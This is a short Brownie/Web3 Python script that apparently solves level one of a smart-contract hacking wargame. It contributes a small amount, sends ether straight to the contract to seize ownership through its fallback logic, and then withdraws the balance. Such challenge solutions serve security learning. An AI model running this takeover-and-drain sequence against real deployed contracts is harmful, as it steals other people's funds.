from webbrowser import get
from scripts.helpful_scripts import *
import json
from brownie import Contract
from web3 import Web3

account = getAccount()


def main():
    with open("./tit.json") as json_file:
        lvl_one = Contract.from_abi(
            "lvl_1", "0x7D6088A1ea6a3409eD6367Ec6e04F9E7c511851C", json.load(json_file)
        )

    lvl_one.contribute({"from": account, "value": Web3.toWei(0.0001, "ether")})
    account.transfer(lvl_one.address, ".00001 ether")
    lvl_one.withdraw({"from": account})
